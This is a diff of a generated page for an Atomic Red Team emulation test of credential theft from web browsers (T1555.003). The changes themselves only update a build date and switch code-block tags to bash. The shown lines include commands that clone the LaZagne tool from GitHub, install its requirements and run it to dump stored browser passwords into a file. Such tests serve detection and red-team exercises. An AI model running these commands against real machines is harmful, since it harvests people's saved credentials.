@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1555.003"
 attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "sh"
 aliases:
   - "87e88698-621b-4c45-8a89-4eaebdeaabb1"
@@ -64,13 +64,13 @@ Get Lazagne from Github and install requirements
 
 ### Prerequisite Check
 
-```text
+```bash
 test -f #{lazagne_path}/laZagne.py
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
 ```
 
@@ -78,13 +78,13 @@ Needs git, python3 and some pip stuff
 
 ### Prerequisite Check
 
-```text
+```bash
 which git && which python3 && which pip
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
 ```
 
@@ -95,13 +95,13 @@ apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
 
 ### Command
 
-```sh
+```bash
 python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}
 ```
 
 ### Cleanup
 
-```sh
+```bash
 rm -R /tmp/LaZagne; rm -f #{output_file}
 ```
 
